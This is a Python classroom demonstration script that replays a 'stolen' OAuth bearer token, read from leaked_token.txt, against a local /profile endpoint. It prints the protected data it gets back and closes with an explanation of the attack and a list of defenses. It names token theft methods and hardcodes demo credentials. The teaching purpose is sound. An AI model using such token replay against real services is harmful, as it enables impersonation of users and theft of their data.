#!/usr/bin/env python3
"""
=============================================================================
ATTACKER SCRIPT - Token Replay Attack Demonstration
=============================================================================
EDUCATIONAL DEMO ONLY - For classroom demonstration of OAuth security

This script simulates an attacker who has stolen an OAuth access token
and is using it to access protected resources without the user's credentials.

DEMONSTRATION STEPS:
1. Attacker obtains the stolen token (from leaked_token.txt)
2. Attacker uses the token directly to call the /profile API
3. Server validates token and returns protected data
4. Attacker now has access to user's data WITHOUT knowing password

REAL-WORLD TOKEN THEFT METHODS:
- Cross-Site Scripting (XSS)
- Man-in-the-Middle attacks (HTTP without TLS)
- Insecure localStorage/sessionStorage
- Malicious browser extensions
- CSRF attacks
- Log exposure (tokens in URLs, server logs)
=============================================================================
"""

import requests
import json
import sys

API_BASE = "http://localhost:5002"

def display_banner():
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║                     TOKEN REPLAY ATTACK DEMONSTRATION                     ║
║                        Educational Demo Only                              ║
╚══════════════════════════════════════════════════════════════════════════╝
    """)

def get_stolen_token():
    """Read the stolen token from the leaked_token.txt file."""
    print("[ATTACKER] Attempting to read stolen token from leaked_token.txt...")
    print("-" * 70)
    
    try:
        with open("leaked_token.txt", "r") as f:
            content = f.read()
            print(content)
            print("-" * 70)
            
        # Extract token from the file
        for line in content.split("\n"):
            if line.startswith("Token:"):
                return line.split("Token:")[1].strip()
    except FileNotFoundError:
        print("[ATTACKER] ERROR: leaked_token.txt not found!")
        print("[ATTACKER] You need to log in first to generate a stolen token.")
        print("[ATTACKER] Run: python server.py, then login at http://localhost:3000")
        return None
    except Exception as e:
        print(f"[ATTACKER] ERROR reading token file: {e}")
        return None

def use_stolen_token(token):
    """
    Use the stolen token to access the protected /profile endpoint.
    This demonstrates a TOKEN REPLAY ATTACK.
    """
    print("\n[ATTACKER] Using stolen token to access protected /profile endpoint...")
    print("-" * 70)
    
    # Make request with the stolen token
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(f"{API_BASE}/profile", headers=headers)
        
        print(f"[ATTACKER] Request sent to: {API_BASE}/profile")
        print(f"[ATTACKER] Authorization header: Bearer {token[:20]}...")
        print(f"[ATTACKER] Response status: {response.status_code}")
        print("-" * 70)
        
        if response.status_code == 200:
            data = response.json()
            print("\n[ATTACKER] SUCCESS! Server accepted the stolen token!\n")
            print("╔══════════════════════════════════════════════════════════════════╗")
            print("║                    ATTACKER OBTAINED USER DATA                     ║")
            print("╚══════════════════════════════════════════════════════════════════╝\n")
            print(f"   Username: {data.get('username')}")
            print(f"   Role: {data.get('role')}")
            print(f"   Access Level: {data.get('access_level')}")
            print(f"\n   Protected Data:")
            print(f"   - Type: {data.get('protected_data', {}).get('type')}")
            print(f"   - Records: {data.get('protected_data', {}).get('records')}")
            print(f"   - Format: {data.get('protected_data', {}).get('format')}")
            print(f"   - Sensitivity: {data.get('protected_data', {}).get('sensitivity')}")
            print("\n" + "=" * 70)
            print("[ATTACKER] I now have access to user's protected data!")
            print("[ATTACKER] I did NOT know the user's password (student/1234)")
            print("[ATTACKER] I only used the STOLEN TOKEN to impersonate the user!")
            print("=" * 70)
            return True
        else:
            print(f"[ATTACKER] Failed to access resource: {response.text}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("[ATTACKER] ERROR: Could not connect to the server.")
        print("[ATTACKER] Is the Flask server running on port 5002?")
        print("[ATTACKER] Run: PORT=5002 python server.py")
        return False

def show_attack_explanation():
    """Display an explanation of the attack."""
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║                         HOW THE ATTACK WORKED                           ║
╚══════════════════════════════════════════════════════════════════════════╝

1. VICTIM LOGS IN:
   - User visits http://localhost:3000/login
   - Enters credentials: student / 1234
   - Server issues access token
   - Token is saved to leaked_token.txt (simulating theft)

2. ATTACKER OBTAINS TOKEN:
   - Attacker reads leaked_token.txt
   - Or: Token stolen via XSS, MITM, insecure storage, etc.

3. ATTACKER USES TOKEN:
   - Attacker calls /profile with stolen token
   - Server validates token (it's valid!)
   - Server returns protected data

4. RESULT:
   - Attacker accesses data WITHOUT knowing password
   - This is called a TOKEN REPLAY ATTACK

╔══════════════════════════════════════════════════════════════════════════╗
║                           REAL-WORLD IMPACT                              ║
╚══════════════════════════════════════════════════════════════════════════╝

If this were a real OAuth system:
- Attacker could access Gmail, GitHub, Office 365, etc.
- Attacker could make API calls as the victim
- Attacker could steal sensitive data
- Victim's credentials remain unknown to attacker

╔══════════════════════════════════════════════════════════════════════════╗
║                         DEFENSES (IN PRODUCTION)                         ║
╚══════════════════════════════════════════════════════════════════════════╝

1. SHORT TOKEN LIFETIME - Tokens expire quickly (e.g., 1 hour)
2. TOKEN ROTATION - Use refresh tokens, invalidate old access tokens
3. HTTPS/TLS - Encrypt all traffic to prevent interception
4. SECURE STORAGE - Use httpOnly cookies, encrypted storage
5. TOKEN BINDING - Bind tokens to specific devices/sessions
6. MONITORING - Detect unusual token usage patterns
7. MFA - Require additional authentication for sensitive actions
""")

def main():
    display_banner()
    
    print("[ATTACKER] This script demonstrates a TOKEN REPLAY ATTACK")
    print("[ATTACKER] Step 1: Obtain the stolen token from leaked_token.txt\n")
    
    token = get_stolen_token()
    
    if not token:
        print("\n[ATTACKER] ABORTING: Cannot demonstrate attack without stolen token.")
        sys.exit(1)
    
    print(f"\n[ATTACKER] Token obtained: {token[:20]}...\n")
    print("[ATTACKER] Step 2: Use the stolen token to access protected resources\n")
    
    success = use_stolen_token(token)
    
    if success:
        print("\n")
        show_attack_explanation()
    else:
        print("\n[ATTACKER] Attack failed - check server status and try again.")
        sys.exit(1)

if __name__ == "__main__":
    main()
